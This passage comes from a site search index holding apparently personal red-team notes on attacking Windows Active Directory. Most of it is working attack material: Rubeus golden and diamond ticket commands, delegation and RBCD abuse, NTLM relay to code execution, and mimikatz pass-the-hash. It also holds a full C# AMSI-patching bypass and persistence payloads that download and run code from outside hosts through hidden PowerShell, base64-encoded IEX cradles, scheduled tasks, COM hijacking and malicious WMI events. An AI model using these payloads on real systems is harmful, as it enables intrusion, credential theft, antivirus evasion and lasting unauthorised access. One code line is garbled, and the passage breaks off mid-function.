</p>"},{"location":"notes/red/windows/70%25/Leteral%20Movement/Leteral%20Movement/#another-creds","title":"Another Creds","text":""},{"location":"notes/red/windows/70%25/Leteral%20Movement/Leteral%20Movement/#golden-diamond","title":"Golden &amp; Diamond","text":"<pre><code># DAMOND\nRubeus.exe diamond /tgtdeleg /domain:evil.corp /dc:DC20.evil.corp /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:40e577a38c16cdd96047a7ae19c61b69e180051e12785527cda7a214e238e6b8 /ptt /nowrap\n\n# GOLDEN\nRubeus.exe golden /aes256:40e577a38c16cdd96047a7ae19c61b69e180051e12785527cda7a214e238e6b8 /domain:evil.corp /sid:S-1-5-21-3013900923-796858115-4076014446 /user:Administrator /ptt\n</code></pre>"},{"location":"notes/red/windows/70%25/Leteral%20Movement/Leteral%20Movement/#skovenoteswindows-archactive-directorykerbroskerberoastingkerberoasting","title":"[[skove/notes/windows arch/active directory/Kerbros#Kerberoasting|Kerberoasting]]","text":""},{"location":"notes/red/windows/70%25/Leteral%20Movement/Leteral%20Movement/#skovenoteswindows-archactive-directorykerbrosas-rep-roastingas-rep-roasting","title":"[[skove/notes/windows arch/active directory/Kerbros#AS-REP Roasting|AS-REP Roasting]]","text":""},{"location":"notes/red/windows/70%25/Leteral%20Movement/Leteral%20Movement/#cashed-tickets","title":"Cashed Tickets","text":"<p>you first want to know which computer has Unconstrained Delegation enabled: <pre><code>ldapsearch -x -H ldap://192.168.1.100 -D \"hacker@forest.lab\" -w \"palestine\" -b \"DC=forest,DC=lab\" \"(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" distinguishedName \n</code></pre></p> <p>now keep listining: <pre><code>rubeus monitor /targetuser:menna /interval:1 /nowrap\n</code></pre></p> <p>with only dir \\win10.forest.lab\\tmp can catch the TGT  </p> <p>if now one made that smb request you can try to use this one: <pre><code>SpoolSample.exe dc19.forest.lab win10.forest.lab\n</code></pre> this should ask the dc19 to auth with the win10 !! </p> <p>also maybe there is a constrained Delegation: <pre><code>ldapsearch -LLL -x -H ldap://192.168.1.100 -D \"hacker@forest.lab\" -w \"palestine\" -b \"DC=forest,DC=lab\" \"(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))\"\n</code></pre></p> <p>you do not have to stick with the msDS-AllowedToDelegateTo name. for example if eventlog only enabled you can use the flag <code>/altservice:cifs</code> with the rubeus command blow: \ud83d\udd3b</p> <p>if there is you can try to make a S4U: <pre><code>Rubeus.exe s4u /impersonateuser:hana /msdsspn:cifs/dc19.forest.lab /user:win10$ /ticket:&lt;win10$-TGT-base64&gt; /nowrap /opsec\n</code></pre></p> <p>you can got the  usign Rubeus [triage, dump, asktgt]"},{"location":"notes/red/windows/70%25/Leteral%20Movement/Leteral%20Movement/#resource-based-constrained-delegation-rbcd","title":"resource-based constrained delegation (RBCD)","text":"<p>you access a service on a computer with any user if you have this permition to change the property  <code>msds-allowedtoactonbehalfofotheridentity</code>  check that with <code>PowerView</code>:  <pre><code>Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDS | ? { $_.ActiveDirectoryRights -match \"WriteProperty|GenericWrite|GenericAll|WriteDacl\" -and $_.SecurityIdentifier -match \"S-1-5-21-2027079033-1722292501-3090208703-[\\d]{4,10}\" } \n</code></pre></p> <p>this regex S-1-5-21-2027079033-1722292501-3090208703-[\\d]{4,10}  to list the domain users only, just change the first part with the domain SID </p> <p>you can find it with <code>Get-DomainUser  -Identity \"menna\" | fl objectsid</code></p> <p>now you need the computer account if you do not have one just create a new computer with <code>standin</code> </p> <p>now do it with  <pre><code>$target = \"WIN10\";\n$attacksid = \"S-1-5-21-2027079033-1722292501-3090208703-1105\";\n\n$rsd = New-Object Security.AccessControl.RawSecurityDescriptor \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$attacksid)\";\n$rsdb = New-Object byte[] ($rsd.BinaryLength);\n$rsd.GetBinaryForm($rsdb,0);\nGet-DomainComputer -Identity $target | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$rsdb}\n</code></pre></p> <p>the $sid is the sid of the computer you will use or the computer you created  </p>"},{"location":"notes/red/windows/70%25/Leteral%20Movement/Leteral%20Movement/#ntlm-relaying","title":"NTLM relaying","text":"<ol> <li>forward the service {smb} packets to ntlmrelayx host using netsh or <code>SteamDivert</code> if you don't want to stop SMB or whatever the service.  <pre><code># dump the SAM \nsudo ntlmrelayx.py -t smb://192.168.1.100 -smb2support --no-multirelay -debug\n\n# RCE \nsudo /home/anas/.local/bin/ntlmrelayx.py -t smb://192.168.1.101 -smb2support -debug -c \"powershell.exe -EncodedCommand &lt;RCE-Base64&gt;\"\n</code></pre></li> </ol>"},{"location":"notes/red/windows/70%25/Leteral%20Movement/Leteral%20Movement/#dacl","title":"DACL","text":"<p>first check who can edit this user <pre><code># for one user \nGet-DomainObjectAcl -Identity jadams | ? { $_.ActiveDirectoryRights -match \"GenericAll|WriteProperty|WriteDacl\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select SecurityIdentifier, ActiveDirectoryRights | fl\n\n# for all the users \n Get-DomainObjectAcl -SearchBase \"CN=Users,DC=dev,DC=cyberbotic,DC=io\" | ? { $_.ActiveDirectoryRights -match \"GenericAll|WriteProperty|WriteDacl\" -and $_.SecurityIdentifier -match \"S-1-5-21-3263068140-2042698922-2891547269-[\\d]{4,10}\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl\n\n # this will seach only for the users because the last regex. if you want to search for all use the script below or just remove the last condition ;)  \n</code></pre></p> <p>or use my script:  <pre><code>Get-DomainObjectAcl -Server 192.168.1.100 -Identity hana |\n    ? { $_.ActiveDirectoryRights -match \"GenericAll|WriteProperty|WriteDacl\" } |\n    % { \n        $sid = $_.SecurityIdentifier\n        $name = try { (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]) } catch { $sid }\n        [PSCustomObject]@{\n            ObjectDN = $_.ObjectDN\n            Rights   = $_.ActiveDirectoryRights\n            Identity = $name\n        }\n    }\n</code></pre></p>"},{"location":"notes/red/windows/70%25/Leteral%20Movement/Leteral%20Movement/#log-in-to-remote","title":"Log in to remote","text":"<ul> <li>inject a fake token into lsass.exe: <pre><code>PS&gt; .\\mimikatz.exe \"sekurlsa::pth /user:Alice /domain:domain.com\n/ntlm:a0c8746a6efc7782c7c19c55185145be\"\n</code></pre></li> <li> <p>then use:  <pre><code>psexec.exe \\\\192.168.1.100 cmd.exe\n</code></pre></p> </li> <li> <p>PsExec (Sysinternals):</p> <ol> <li>Authenticate via SMB (user/pass or hash).</li> <li>Upload <code>PSEXESVC.exe</code>.</li> <li>Create a remote Windows service using <code>CreateService</code> API.</li> <li>Start service \u2192 runs your target process (<code>cmd.exe</code> or other).</li> <li>Notes: Requires admin + \u201clogon as service\u201d; blocked on DCs for normal admins.</li> </ol> </li> <li>wmiexec.py (Impacket):<ol> <li>Authenticate via username/password or NTLM hash.</li> <li>Call WMI class <code>Win32_Process.Create()</code> to spawn a command.</li> <li>Capture stdout/stderr via WMI and return to client.</li> <li>Notes: Works even if service creation is blocked; good for DCs or restricted users.</li> </ol> </li> <li>smbexec.py (Impacket):<ol> <li>Authenticate via SMB.</li> <li>Upload payload.</li> <li>Execute payload using remote service or <code>at</code> scheduler trick.</li> <li>Stream output back via SMB.</li> <li>Cleanup temporary executable.</li> <li>Notes: Bypasses PsExec UAC/service restrictions; good for DCs where normal PsExec fails.</li> </ol> </li> <li>psexec.py (Impacket):<ol> <li>Authenticate via username/password or NTLM hash.</li> <li>Upload <code>psexecsvc.exe</code> to the target machine.</li> <li>Use Service Control Manager (SCM) to create and start the service that runs your command.</li> <li>Capture stdout/stderr over SMB back to your machine.</li> <li>Stop service and remove temporary executable.</li> <li>Notes: Functionally similar to Sysinternals PsExec but implemented in Python/Impacket; can work with hashes and scripting automation; still requires admin/service rights for remote service creation.</li> </ol> </li> </ul>"},{"location":"notes/red/windows/70%25/Leteral%20Movement/Leteral%20Movement/#laps","title":"LAPS","text":"<p>[[skove/notes/windows arch/active directory/LAPS]]</p>"},{"location":"notes/red/windows/70%25/OPSEC/OPSEC/","title":"Tips","text":"<ul> <li>before trying to bypass the AV, check the Exclusions <code>Get-MpPreference | select Exclusion*</code> paths, extention or process. </li> </ul>"},{"location":"notes/red/windows/70%25/OPSEC/OPSEC/#artifact","title":"Artifact","text":"<p>artifact is the shellcode runner that take the shellcode of the c2 like sliver and run it. the best option is using <code>Nim</code>, <code>Go</code> or complex with <code>C/C++</code>. </p> <p>so your shellcode runner (Artifact) should contains:</p>"},{"location":"notes/red/windows/70%25/OPSEC/OPSEC/#sleepmask","title":"SleepMask","text":"<p>add SleepMask to XOR encrypt the strings in memory to evade from the memory scanner. </p>"},{"location":"notes/red/windows/70%25/OPSEC/OPSEC/#amsiscanbuffer-patching","title":"AmsiScanBuffer Patching","text":"<p>AmsiScanBuffer\u00a0is an API exported from\u00a0<code>amsi.dll</code>\u00a0- the library that implements the Antimalware Scan Interface (AMSI). Applications, such as PowerShell </p> <p>so AmsiScanBuffer will take the buffer and return a number if number less than 32768 mean AMSI_RESULT_DETECTED </p> <p>so you becasue you own the process you can write over the memory where AmsiScanBuffer exist and write  <pre><code>mov eax, 0x80070057\nret\n</code></pre></p> <p>so it will return 0x80070057 which is a code for \"invalid parameter\". and volaah you bypassed the AMSI, and here a PoC: </p> <pre><code>using System;\nusing System.Diagnostics;\nusing System.Runtime.InteropServices;\nusing System.Text;\nusing System.IO;\n\nnamespace AmsiBypassDemo\n{\n    class Program\n    {\n        static IntPtr _amsiContext;\n        static IntPtr _amsiSession;\n\n        static readonly byte[] AmsiPatchBytes = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };\n\n        const uint PAGE_EXECUTE_READWRITE = 0x40; \n\n        [DllImport(\"amsi.dll\")]\n        static extern uint AmsiInitialize(string appName, out IntPtr amsiContext);\n\n        [DllImport(\"amsi.dll\")]\n        static extern uint AmsiOpenSession(IntPtr amsiContext, out IntPtr amsiSession);\n\n        [DllImport(\"amsi.dll\")]\n        static extern uint AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, uint length, string contentName, ref IntPtr amsiSession, out uint scanResult);\n\n        [DllImport(\"amsi.dll\")]\n        static extern uint AmsiCloseSession(IntPtr amsiContext, IntPtr amsiSession);\n\n        [DllImport(\"amsi.dll\")]\n        static extern void AmsiUninitialize(IntPtr amsiContext);\n\n        [DllImport(\"kernel32.dll\", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]\n        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        public static extern IntPtr LoadLibrary(string lpFileName);\n\n        [DllImport(\"kernel32.dll\")]\n        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n\n        static string ScanContent(byte[] sample)\n        {\n            AmsiScanBuffer(_amsiContext, sample, (uint)sample.Length, \"Demo Sample\", ref _amsiSession, out uint amsiResult);\n\n            return amsiResult &gt;= 32768 ? \"AMSI_RESULT_DETECTED\" : \"AMSI_RESULT_NOT_DETECTED\";\n        }\n\n        static void Main(string[] args)\n        {\n            Console.Title = \"AMSI Bypass PoC\";\n\n            Console.WriteLine(\"[*] Initializing AMSI...\");\n            AmsiInitialize(\"AMSI Bypass Demo App\", out _amsiContext);\n            AmsiOpenSession(_amsiContext, out _amsiSession);\n\n            var maliciousContent = Encoding.UTF8.GetBytes(@\"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\");\n\n            Console.WriteLine(\"\\n[--- Phase 1: Pre-Patch Scan ---]\");\n            var resultBefore = ScanContent(maliciousContent);\n            Console.WriteLine($\"[RESULT] Scan before patch: {resultBefore}\");\n\n            if (resultBefore == \"AMSI_RESULT_NOT_DETECTED\")\n            {\n                Console.ForegroundColor = ConsoleColor.Yellow;\n                Console.WriteLine(\"\\n[WARNING] AMSI did not detect the EICAR string. The test might not be effective.\");\n                Console.WriteLine(\"    This usually happens if Windows Defender is disabled or if the process context is not trusted.\");\n                Console.ResetColor();\n            }\n\n            Console.WriteLine(\"\\n[--- Phase 2: Applying Patch ---]\");\n\n            IntPtr hAmsi = LoadLibrary(\"amsi.dll\");\n            IntPtr asbAddress = GetProcAddress(hAmsi, \"AmsiScanBuffer\");\n\n            if (asbAddress == IntPtr.Zero)\n            {\n                Console.ForegroundColor = ConsoleColor.Red;\n                Console.WriteLine(\"[-] Failed to find AmsiScanBuffer address. Exiting.\");\n                Console.ResetColor();\n                return;\n            }\n            Console.WriteLine($\"[+] AmsiScanBuffer Address (ASB): 0x{asbAddress.ToInt64():X}\");\n\n            uint oldProtect;\n            bool success = VirtualProtect(asbAddress, (UIntPtr)AmsiPatchBytes.Length, PAGE_EXECUTE_READWRITE, out oldProtect);\n\n            if (!success)\n            {\n                Console.ForegroundColor = ConsoleColor.Red;\n                Console.WriteLine(\"[-] VirtualProtect failed to change memory permissions. Exiting.\");\n                Console.ResetColor();\n                return;\n            }\n            Console.WriteLine($\"[+] Memory permissions changed (Old Protect: 0x{oldProtect:X}).\");\n\n            Marshal.Copy(AmsiPatchBytes, 0, asbAddress, Ams[]()iPatchBytes.Length);\n            Console.WriteLine($\"[+] Wrote {AmsiPatchBytes.Length} bytes patch (mov eax, E_INVALIDARG; ret) to ASB.\");\n\n            VirtualProtect(asbAddress, (UIntPtr)AmsiPatchBytes.Length, oldProtect, out uint _);\n            Console.WriteLine($\"[+] Memory permissions restored to 0x{oldProtect:X}.\");\n\n\n            Console.WriteLine(\"\\n[--- Phase 3: Post-Patch Scan ---]\");\n\n            var resultAfter = ScanContent(maliciousContent);\n\n            Console.ForegroundColor = ConsoleColor.Green;\n            Console.WriteLine($\"[RESULT] Scan after patch: {resultAfter}\");\n            Console.ResetColor();\n\n            Console.WriteLine(\"\\n[*] AMSI Uninitialized.\");\n            AmsiCloseSession(_amsiContext, _amsiSession);\n            AmsiUninitialize(_amsiContext);\n        }\n    }\n}\n</code></pre>"},{"location":"notes/red/windows/70%25/OPSEC/OPSEC/#_1","title":"OPSEC","text":""},{"location":"notes/red/windows/70%25/persistence/AD%20persistance/","title":"AD Persistence","text":""},{"location":"notes/red/windows/70%25/persistence/AD%20persistance/#certificate-services","title":"certificate services","text":"<p>if there is CA in the domain you can:</p> <p>enum for existing cert <pre><code>seatbelt.exe Certificates # export password is mimikatz\nmimikatz crypto::certificates /export # /systemstore:local_machine \n</code></pre> or request a new one <pre><code>Certify.exe request /template:User /ca:DC19.forest.lab\\forest-DC19-CA\nCertify.exe request /ca:dc-2.dev.cyberbotic.io\\ca-2 /template:Machine /machine \n</code></pre> then use rebeus to request a TGT, even if the password changed the cert will still vaild.</p>"},{"location":"notes/red/windows/70%25/persistence/AD%20persistance/#privilages-persistance","title":"privilages persistance","text":"<p>AdminSDHold is a DACL template for the protected objects. SDProp is a process that copy the ACL from <code>CN=AdminSDHolder,CN=System,...</code> every ~60 minutes. so the user will get these permitions back even if the administrator removed you  <pre><code>Add-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=dev,DC=cyberbotic,DC=io\" -PrincipalIdentity bfarmer -Rights All\n</code></pre></p>"},{"location":"notes/red/windows/70%25/persistence/AD%20persistance/#laps","title":"LAPS","text":"<p>[[skove/notes/windows arch/active directory/LAPS#persistance]]</p>"},{"location":"notes/red/windows/70%25/persistence/persistence/","title":"General Persistence","text":""},{"location":"notes/red/windows/70%25/persistence/persistence/#schtask","title":"SchTask","text":"<pre><code>$wc = New-Object System.Net.WebClient\n$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()\n$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n$p=\"$env:TEMP\\svchost.exe\"\nif (!(Test-Path $p)) {\n    $wc.DownloadFile(\"https://anas.com:7443/direct/download/6581eb97-b1c0-4e5c-b19d-9e50361e87ed\", $p)\n}\nStart-Process $p -WindowStyle Hidden\n</code></pre> <p>encode it  <pre><code>$str = 'IEX ((new-object net.webclient).downloadstring(\"http://192.168.1.3:6696/a\"))'\n[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($str))\n</code></pre></p> <p>run it <pre><code>powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADMAOgA2ADYAOQA2AC8AYQAiACkAKQA=\n</code></pre></p> <p>or in SharPersist.exe <pre><code>SharPersist.exe -n TaskName -m add -o hourly -t schtask -c powershell.exe -a \"-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADMAOgA2ADYAOQA2AC8AYQAiACkAKQA=\"  \n</code></pre></p>"},{"location":"notes/red/windows/70%25/persistence/persistence/#startup-folder","title":"StartUp folder","text":"<pre><code>SharPersist.exe -t startupfolder -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden -enc &lt;base64_encoded_string&gt;\" -f \"UserEnvSetup\" -m add\n</code></pre>"},{"location":"notes/red/windows/70%25/persistence/persistence/#registry-autorun","title":"Registry AutoRun","text":"<pre><code>SharPersist.exe -t reg -c \"C:\\ProgramData\\Updater.exe\" -a \"/q /n\" -k \"hkcurun\" -v \"Updater\" -m add\n\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"MyAgent\" -Value \"C:\\Users\\anas\\AppData\\Roaming\\myagent.exe\"\n</code></pre>"},{"location":"notes/red/windows/70%25/persistence/persistence/#com-jijiacking","title":"COM Jijiacking","text":"<p>COM Hijacking is a persistence or privilege escalation technique where an attacker modifies registry entries that define where Windows looks for certain COM objects.</p> <pre><code>dynamic word =  Activator.CreateInstance(Type.GetTypeFromProgID(\"Word.Application\"));\n</code></pre> <p>so COM will search for it under  HKEY_CLASSES_ROOT\\CLSID{CLSID} while HKCR is HKCU and HKLM mixed </p> <p>so we need to find a CLSID exist in HKLM and not in HKLM cuz this means it is legit and you know it will called </p> <pre><code>$x = '01575CFE-9A55-4003-A5E1-F38D1EBDCBE1'\nGet-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{$x}\\InprocServer32\"\nGet-Item -Path \"HKLM:\\Software\\Classes\\CLSID\\{$x}\\InprocServer32\"\n\nGet-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{$x}\"\nGet-Item -Path \"HKLM:\\Software\\Classes\\CLSID\\{$x}\"\n</code></pre> <p>so you got a CLSID? injecte it </p> <pre><code>New-Item -Path \"HKCU:Software\\Classes\\CLSID\" -Name \"{$x}\"\nNew-Item -Path \"HKCU:Software\\Classes\\CLSID\\{$x}\" -Name \"InprocServer32\" -Value \"C:\\Users\\anas\\agent.dll\"\nNew-ItemProperty -Path \"HKCU:Software\\Classes\\CLSID\\{$x}\\InprocServer32\" -Name \"ThreadingModel\" -Value \"Both\"\n</code></pre> <p>To remove it:  <pre><code>Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{$x}\" -Recurse\n</code></pre></p>"},{"location":"notes/red/windows/70%25/persistence/persistence/#task-scheduler-uses-com-object","title":"Task Scheduler uses COM object \ud83c\udfc6","text":"<pre><code>$Tasks = Get-ScheduledTask\nforeach ($Task in $Tasks)\n{\n    if ($Task.Actions.ClassId -ne $null)\n    {\n        if ($Task.Triggers.Enabled -eq $true)\n        {\n            if ($Task.Principal.GroupId -eq \"Users\")\n            {\n                Write-Host \"Task Name: \" $Task.TaskName\n                Write-Host \"Task Path: \" $Task.TaskPath\n                Write-Host \"CLSID: \" $Task.Actions.ClassId\n                Write-Host\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"notes/red/windows/70%25/persistence/persistence/#wmi-event","title":"WMI event","text":""},{"location":"notes/red/windows/70%25/persistence/persistence/#get-wmievent","title":"Get-WmiEvent","text":"<pre><code>&lt;#\n.SYNOPSIS\n\nBy default, Get-WmiEvent queries WMI for all __FilterToConsumerBinding instances and associated __EventFilter, and __EventConsumer instances. \n\n.DESCRIPTION\n\nThis function will query and return all instances of the __FilterToConsumerBinding class and their associated __EventFilter and \n__EventConsumer objects. Parameters are present to return any combination of these instances. It is also possible to filter by name using the -Name parameter.\n\n.PARAMETER Binding\n\nIndicates that WMI _FilterToConsumerBinding instances be returned. \n\n.PARAMETER Consumer\n\nIndicates that WMI event consumers are returned. \n\n.PARAMETER Filter\n\nIndicates that WMI event filters are returned. \n\n.PARAMETER Name\n\nSpecifies the WMI event instance name to return. \n\n.PARAMETER ComputerName\n\nSpecifies the remote computer system to add a permanent WMI event to. The default is the local computer.\n\nType the NetBIOS name, an IP address, or a fully qualified domain name (FQDN) of one or more computers. To specify the local computer, type the computer name, a dot (.), or localhost.\n\n.PARAMETER Credential\n\nThe credential object used to authenticate to the remote system. If not specified, the current user instance will be used.\n\n.EXAMPLE\n\nPS C:\\&gt;Get-WMIEvent -Name TestEvent\n\nThis command will return all WMI event objects named 'TestEvent'.\n\n.EXAMPLE\n\nPS C:\\&gt;Get-WMIEvent -Consumer -Filter\n\nThis command will return all WMI event consumers and filters.\n\n.EXAMPLE\n\nPS C:\\&gt;Get-WMIEvent -Name TestEvent | Remove-WMIEvent\n\nThis command will return all WMI event objects with the name TestEvent.\n\n.OUTPUTS\n\nSystem.Management.ManagementBaseObject.ManagementObject\n\nThis cmdlet returns System.Management.ManagementBaseObject.ManagementObject objects.\n\n#&gt;\n\nfunction Get-WmiEvent {\n\n    Param (\n\n        [Switch]\n        $Binding,\n\n        [String]\n        $ComputerName,\n\n        [Switch]\n        $Consumer,\n\n        [Management.Automation.PSCredential]\n        $Credential,\n\n        [Switch]\n        $Filter,\n\n        [String]\n        $Name\n\n    )\n    $Arguments = @{}\n    if ($ComputerName){\n        $Arguments['ComputerName'] = $ComputerName\n        if ($Credential){\n            $Arguments['Credential'] = $Credential\n        }\n    }\n    if ($Name){\n        $Arguments['Filter'] = \"__RELPATH LIKE `\"%$Name%`\"\"\n    }\n    if (!$Binding -and !$Consumer -and !$Filter){\n        $Events = Get-WmiObject '__FilterToConsumerBinding' -Namespace root/subscription @Arguments\n        if ($Events){\n            foreach($Event in $Events){\n                $Event\n                $ConsumerId = $Event.Consumer\n                $FilterId = $Event.Filter\n                $Arguments['Filter'] = \"__RELPATH='$ConsumerId'\"\n                Get-WmiObject -Namespace root/subscription -Class $($ConsumerId.Split('.')[0]) @Arguments\n                $Arguments['Filter'] = \"__RELPATH='$FilterId'\"\n                Get-WmiObject -Namespace root/subscription -Class $($FilterId.Split('.')[0]) @Arguments\n            }\n        }\n    }\n    if($Binding){\n        Get-WmiObject -Class __FilterToConsumerBinding -Namespace root/subscription @Arguments\n    }\n    if($Consumer){\n        Get-WmiObject -Class __EventConsumer -Namespace root/subscription @Arguments\n    }\n    if($Filter){\n        Get-WmiObject -Class __EventFilter -Namespace root/subscription @Arguments\n    }\n}\n</code></pre>"},{"location":"notes/red/windows/70%25/persistence/persistence/#register-maliciouswmievent","title":"Register-MaliciousWMIEvent","text":"<pre><code>&lt;#\n\nEXAMPLE \nRegister-MaliciousWmiEvent -EventName LogNotepad -PermanentCommand \u201ccmd.exe /c echo %ProcessId% &gt;&gt; c:\\\\temp\\\\log.txt\u201d -Trigger ProcessStart -ProcessName notepad.exe\n\nRegister-MaliciousWmiEvent -EventName Logonlog -PermanentCommand \"C:\\tmp\\x.exe\" -Trigger UserLogon -Username any\n\n.SYNOPSIS\n\nRegisters a malicious WMI Event using predefinied triggers and a user provided action.\n\n.DESCRIPTION\n\nThis cmdlet is the core of PowerLurk. It takes a command, script, or scriptblock as the action, and a precanned trigger, then creates the WMI Filter, \nConsumer, and FilterToConsumerBinding required for a fully functional Permanent WMI Event Subscription. A number of WMI event triggers, or filters, \nare preconfigured. The trigger must be specified with the -Trigger parameter. There are three consumers to choose from, PermanentCommand, \nPermanentScript, and LocalScriptBLock.\n\n.PARAMETER PermanentCommand\n\nIndicates that an operating system command will be executed once the specified WMI event occurs. Provide a string or scriptblock\ncontaining the command you would like to run. \n\n.PARAMETER PermanentScript\n\nIndicates that a provided Jscript or VBScript will run once a WMI event occurs. Provide a string or scriptblock containing \nthe script code you would like executed.\n\n.PARAMETER LocalScriptBlock\n\nIndicates that a provided local event scriptblock be executed once a WMI event occurs.\n\n.PARAMETER Trigger\n\nSpecifies the event trigger (WMI Filter) to use. The options are InsertUSB, UserLogon, ProcessStart, Interval, and Timed. UserLogon is an extrinisic\nevent, so the event object is used with %TargetInstance.PropertyName% rather than %PropertyName% like the other instrinsic options.\n\n.PARAMETER EventName\n\nSpecifies an arbitrary name to be assigned to the new permanent WMI event.\n\n.PARAMETER UserName\n\nSpecifies the username that the UserLogon trigger will generate a WMI event. Use 'any' or '*' for any user logon.\n\n.PARAMETER ProcessName\n\nSpecifies the process name when the ProcessStart trigger is selected (required).\n\n.PARAMETER IntervalPeriod\n\nSpecifies the interval period, in seconds, when the Interval trigger is selected (required).\n\n.PARAMETER ExecutionTime\n\nSpecifies the absolute time to generate a WMI event when the Timed trigger is selected (required).\n\n.PARAMETER ComputerName\n\nSpecifies the remote computer system to add a permanent WMI event to. The default is the local computer.\n\nType the NetBIOS name, an IP address, or a fully qualified domain name (FQDN) of one or more computers. To specify the local computer, type the computer name, a dot (.), or localhost.\n\n.PARAMETER Credential\n\nThe credential object used to authenticate to the remote system. If not specified, the current user instance will be used.\n\n.EXAMPLE\n\nPS C:\\&gt;Register-MaliciousWmiEvent -EventName KillProc -PermanentCommand \"Powershell.exe -NoP -C `\"Stop-Process -Id %ProcessId% -Force`\"\" -Trigger ProcessStart -ProcessName powershell.exe\n\n\nThis command creates a permanent WMI event that will kill the 'powershell.exe' process after it is started.\n\n.EXAMPLE\n\n$script = @\u2019\nSet objFSO=CreateObject(\"Scripting.FileSystemObject\")\noutFile=\"c:\\temp\\log.txt\"\nSet objFile = objFSO.CreateTextFile(outFile,True)\nobjFile.Write \"%TargetInstance.ProcessName% started at PID %TargetInstance.ProcessId%\" &amp; vbCrLf\nobjFile.Close\n\u2018@\n\nPS C:\\&gt;Register-MaliciousWmiEvent -EventName KillProc -PermanentScript $script -Trigger ProcessStart -ProcessName powershell.exe\n\n\nThis command creates a permanent WMI event will execute a log the process name and ID to a log file using VBScript anytime powershell.exe starts.\n\n.EXAMPLE\n\nPS C:\\&gt;Register-MaliciousWmiEvent -EventName DLThumbdrive -PermanentScript $script -Trigger InsertUSB\n\n\nThis command creates a permanent WMI event will execute a script when a new volume is added to the target system, such as a USB storage device or mapped network drive.\n\n.EXAMPLE\n\nPS C:\\&gt;Register-MaliciousWmiEvent -EventName Logonlog -PermanentCommand \"C:\\tmp\\x.exe\" -Trigger UserLogon -Username any\n\n\nThis command creates a permanent WMI event save the Antecedent property of the target event instance, which contains the username and domain, to a log file anytime a user logs in.\n\n.EXAMPLE\n\nPS C:\\&gt;Register-MaliciousWmiEvent -EventName CheckIn -PermanentCommand \"powershell.exe -NoP -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/checkin.html')\" -Trigger Interval -IntervalPeriod 3600\n\n\nThis command creates a permanent WMI event that will perform Invoke-Expression on whatever is returned after a GET request to 'http://10.10.10.10/checkin.html' every 60 minutes.\n\n.EXAMPLE\n\nPS C:\\&gt;Register-MaliciousWmiEvent -EventName ExecuteSystemCheck -PermanentScript $script -Trigger Timed -ExecutionTime '07/07/2016 12:30pm'\n\n\nThis command creates a permanent WMI event execute a specified script at '07/07/2016 12:30pm'\n\n.OUTPUTS \n\nSystem.Management.ManagementBaseObject.ManagementObject\n\nBy default, this cmdlet returns a System.Management.ManagementBaseObject.ManagementObject.\n\n#&gt;\n\nfunction Register-MaliciousWMIEvent {\n\n    Param (\n\n        [String]\n        $ComputerName,\n\n        [Management.Automation.PSCredential]\n        $Credential,\n\n        [Parameter(ParameterSetName = 'LocalUserLogonSet')]\n        [Parameter(ParameterSetName = 'CommandUserLogonSet')]\n        [Parameter(ParameterSetName = 'ScriptUserLogonSet')]\n        [String]\n        [ValidateNotNullOrEmpty()]\n        $Domain,\n\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandInsertUSBSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandUserLogonSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandTimedSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandIntervalSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'CommandProcessStartSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalInsertUSBSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalUserLogonSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalTimedSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalIntervalSet')]\n        [Parameter(Mandatory = $True, ParameterSetName = 'LocalProcessStartSet')]\n        